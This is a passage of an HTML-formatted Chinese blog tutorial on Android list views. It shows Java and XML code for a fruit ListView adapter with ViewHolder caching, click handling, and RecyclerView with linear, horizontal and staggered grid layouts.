class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Fruit&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits(); <span class="comment">// 初始化水果数据</span></span><br><span class="line">        <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(MainActivity.<span class="built_in">this</span>, R.layout.fruit_item, fruitList);</span><br><span class="line">        <span class="type">ListView</span> <span class="variable">listView</span> <span class="operator">=</span> (ListView) findViewById(R.id.list_view);</span><br><span class="line">        listView.setAdapter(adapter);</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initFruits</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">apple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Apple&quot;</span>, R.drawable.apple_pic);</span><br><span class="line">            fruitList.add(apple);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">banana</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Banana&quot;</span>, R.drawable.banana_pic);</span><br><span class="line">            fruitList.add(banana);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">orange</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Orange&quot;</span>, R.drawable.orange_pic);</span><br><span class="line">            fruitList.add(orange);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">watermelon</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Watermelon&quot;</span>, R.drawable.watermelon_pic);</span><br><span class="line">            fruitList.add(watermelon);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">pear</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Pear&quot;</span>, R.drawable.pear_pic);</span><br><span class="line">            fruitList.add(pear);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">grape</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Grape&quot;</span>, R.drawable.grape_pic);</span><br><span class="line">            fruitList.add(grape);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">pineapple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Pineapple&quot;</span>, R.drawable.pineapple_pic);</span><br><span class="line">            fruitList.add(pineapple);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">strawberry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Strawberry&quot;</span>, R.drawable.strawberry_pic);</span><br><span class="line">            fruitList.add(strawberry);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">cherry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Cherry&quot;</span>, R.drawable.cherry_pic);</span><br><span class="line">            fruitList.add(cherry);</span><br><span class="line">            <span class="type">Fruit</span> <span class="variable">mango</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fruit</span>(<span class="string">&quot;Mango&quot;</span>, R.drawable.mango_pic);</span><br><span class="line">            fruitList.add(mango);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>提升效率</strong></p><p>getView还有一个参数convertView，用于将之前加载的布局进行缓存，以便后面复用。</p><p>但是每次还在findViewById()方法。借助ViewHolder</p><p>修改FruitAdapter代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listviewtest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.view.LayoutInflater;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.widget.ArrayAdapter;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageView;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> android.widget.ArrayAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitAdapter</span> <span class="keyword">extends</span> <span class="title class_">ArrayAdapter</span>&lt;Fruit&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">getView</span><span class="params">(<span class="type">int</span> position, View convertView, ViewGroup parent)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> getItem(position); <span class="comment">// 获取当前项的Fruit实例</span></span><br><span class="line">        View view;</span><br><span class="line">        ViewHolder viewHolder;</span><br><span class="line">        <span class="keyword">if</span> (convertView == <span class="literal">null</span>) &#123;</span><br><span class="line">            view = LayoutInflater.from(getContext()).inflate(resourceId, parent, <span class="literal">false</span>);</span><br><span class="line">            viewHolder = <span class="keyword">new</span> <span class="title class_">ViewHolder</span>();</span><br><span class="line">            viewHolder.fruitImage = (ImageView) view.findViewById (R.id.fruit_image);</span><br><span class="line">            viewHolder.fruitName = (TextView) view.findViewById (R.id.fruit_name);</span><br><span class="line">            view.setTag(viewHolder); <span class="comment">// 将ViewHolder存储在View中</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            view = convertView;</span><br><span class="line">            viewHolder = (ViewHolder) view.getTag(); <span class="comment">// 重新获取ViewHolder</span></span><br><span class="line">        &#125;</span><br><span class="line">        viewHolder.fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">        viewHolder.fruitName.setText(fruit.getName());</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ViewHolder</span> &#123;</span><br><span class="line"></span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ListView点击事件</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits(); <span class="comment">// 初始化水果数据</span></span><br><span class="line">        <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(MainActivity.<span class="built_in">this</span>, R.layout.fruit_item, fruitList);</span><br><span class="line">        <span class="type">ListView</span> <span class="variable">listView</span> <span class="operator">=</span> (ListView) findViewById(R.id.list_view);</span><br><span class="line">        listView.setAdapter(adapter);</span><br><span class="line">        listView.setOnItemClickListener(<span class="keyword">new</span> <span class="title class_">AdapterView</span>.OnItemClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view,</span></span><br><span class="line"><span class="params">                                    <span class="type">int</span> position, <span class="type">long</span> id)</span> &#123;</span><br><span class="line">                <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> fruitList.get(position);</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, fruit.getName(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="RecyclerView"><a href="#RecyclerView" class="headerlink" title="RecyclerView"></a>RecyclerView</h3><p>一个增强版的ListView，可以实现和ListView同样的效果，还优化ListView中的不足。</p><p>实现和上面ListView同样功能</p><p>activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;androidx.recyclerview.widget.RecyclerView</span><br><span class="line">     android:<span class="attribute">id</span>=<span class="string">&quot;@+id/recycler_view&quot;</span></span><br><span class="line">     android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">     android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>Fruit和fruit_item.xml同上</p><p>FruitAdapter修改如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.recyclerview;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitAdapter</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.Adapter&lt;FruitAdapter.ViewHolder&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; mFruitList;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FruitAdapter</span><span class="params">(List&lt;Fruit&gt; fruitList)</span>&#123;</span><br><span class="line">        mFruitList=fruitList; <span class="comment">//传递数据源</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>  <span class="keyword">class</span> <span class="title class_">ViewHolder</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.ViewHolder&#123;</span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ViewHolder</span><span class="params">(View itemView)</span> &#123;  <span class="comment">//itemView 子项最外层布局</span></span><br><span class="line">            <span class="built_in">super</span>(itemView);</span><br><span class="line">            fruitImage=itemView.findViewById(R.id.fruit_image);</span><br><span class="line">            fruitName=itemView.findViewById((R.id.fruit_name));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FruitAdapter.ViewHolder <span class="title function_">onCreateViewHolder</span><span class="params">(ViewGroup parent, <span class="type">int</span> viewType)</span> &#123;</span><br><span class="line">        View view= LayoutInflater.from(parent.getContext()).inflate(R.layout.fruit_item,parent,<span class="literal">false</span>);</span><br><span class="line">        ViewHolder holder=<span class="keyword">new</span> <span class="title class_">ViewHolder</span>((view));</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onBindViewHolder</span><span class="params">(FruitAdapter.ViewHolder holder, <span class="type">int</span> position)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> mFruitList.get(position);</span><br><span class="line">        holder.fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">        holder.fruitName.setText(fruit.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getItemCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mFruitList.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>onCreateViewHolder()：创建ViewHolder实例，把加载出来的布局传入到构造函数中，最后将ViewHolder实例返回</p><p>onBindViewHolder()：对RecyclerView子项的数据进行赋值，会在每个子项滚到屏幕内执行，通过position获得Fruit实例，再设置数据。</p><p>getItemCount()：数据源长度</p><p>MainActivity如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.recyclerview;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList =<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits();<span class="comment">//初始化数据</span></span><br><span class="line">        <span class="type">RecyclerView</span> <span class="variable">recyclerView</span> <span class="operator">=</span> findViewById(R.id.recycler_view);</span><br><span class="line">        <span class="type">LinearLayoutManager</span> <span class="variable">layoutManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinearLayoutManager</span>(<span class="built_in">this</span>);</span><br><span class="line">        recyclerView.setLayoutManager(layoutManager);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(fruitList);</span><br><span class="line">        recyclerView.setAdapter(adapter);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initFruits</span><span class="params">()</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>layoutManager：指定RecyclerView布局方式，这里使用LinearLayoutManager是线性布局的意思</p><h4 id="实现横向滚动和瀑布流布局"><a href="#实现横向滚动和瀑布流布局" class="headerlink" title="实现横向滚动和瀑布流布局"></a>实现横向滚动和瀑布流布局</h4><p><strong>横线滚动</strong></p><p>修改fruit_item</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;100dp&quot;</span>  //<span class="attr">为了避免名字长短不一</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_image&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;10dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList =<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits();</span><br><span class="line">        <span class="type">RecyclerView</span> <span class="variable">recyclerView</span> <span class="operator">=</span> findViewById(R.id.recycler_view);</span><br><span class="line">        <span class="type">LinearLayoutManager</span> <span class="variable">layoutManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinearLayoutManager</span>(<span class="built_in">this</span>);</span><br><span class="line">        </span><br><span class="line">        layoutManager.setOrientation(LinearLayoutManager.HORIZONTAL);</span><br><span class="line">        </span><br><span class="line">        recyclerView.setLayoutManager(layoutManager)；</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(fruitList);</span><br><span class="line">        recyclerView.setAdapter(adapter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上面RecyclerView基本使用相比，多了<code>layoutManager.setOrientation(LinearLayoutManager.HORIZONTAL);</code></p><p>这个方法用来设置布局排列方向，默认是纵向的，传入LinearLayoutManager.HORIZONTAL表示布局横向排列，就可以横向滚动了。</p><p>除了LinearLayoutManager，RecyclerView还提供<code>GridLayoutManager</code>和<code>StaggeredGridLayoutManager</code></p><p>GridLayoutManager：实现网络布局</p><p>StaggeredGridLayoutManager：实现瀑布流布局</p><p><strong>对于瀑布流实现做如下修改</strong></p><p><strong>fruit_item.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>   //<span class="attr">瀑布布局宽度由列数决定</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_margin</span>=<span class="string">&quot;5dp&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_image&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;left&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;10dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>MainActivity</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在上面例子中做如下修改</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits();</span><br><span class="line">        <span class="type">RecyclerView</span> <span class="variable">recyclerView</span> <span class="operator">=</span> findViewById(R.id.recycler_view);</span><br><span class="line">    </span><br><span class="line">        <span class="type">StaggeredGridLayoutManager</span> <span class="variable">layoutManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StaggeredGridLayoutManager</span>(<span class="number">3</span>, StaggeredGridLayoutManager.VERTICAL);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        recyclerView.setLayoutManager(layoutManager);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(fruitList);</span><br><span class="line">        recyclerView.setAdapter(adapter);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//StaggeredGridLayoutManager </span></span><br><span class="line"><span class="comment">//第一个参数为列数，第二个参数是排列方向</span></span><br></pre></td></tr></table></figure><h4 id="RecyclerView点击事件"><a href="#RecyclerView点击事件" class="headerlink" title="RecyclerView点击事件"></a>RecyclerView点击事件</h4><p>RecyclerView没有提供类似ListView的点击事件接口，ListView点击事件是针对子项的，对于子项的一个控件的点击事件需要另外实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对基本的RecyclerView操作的FruitAdapter进行如下添加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span>  <span class="keyword">class</span> <span class="title class_">ViewHolder</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.ViewHolder&#123;</span><br><span class="line">        View fruitView;</span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ViewHolder</span><span class="params">(View itemView)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(itemView);</span><br><span class="line">            fruitView=itemView;</span><br><span class="line">            fruitImage=itemView.findViewById(R.id.fruit_image);</span><br><span class="line">            fruitName=itemView.findViewById((R.id.fruit_name));</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> FruitAdapter.ViewHolder <span class="title function_">onCreateViewHolder</span><span class="params">(ViewGroup parent, <span class="type">int</span> viewType)</span> &#123;</span><br><span class="line">        View view= LayoutInflater.from(parent.getContext()).inflate(R.layout.fruit_item,parent,<span class="literal">false</span>);</span><br><span class="line">        ViewHolder holder=<span class="keyword">new</span> <span class="title class_">ViewHolder</span>((view));</span><br><span class="line">        holder.fruitView.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> holder.getAdapterPosition();</span><br><span class="line">                <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> mFruitList.get(position);</span><br><span class="line">                Toast.makeText(view.getContext(), <span 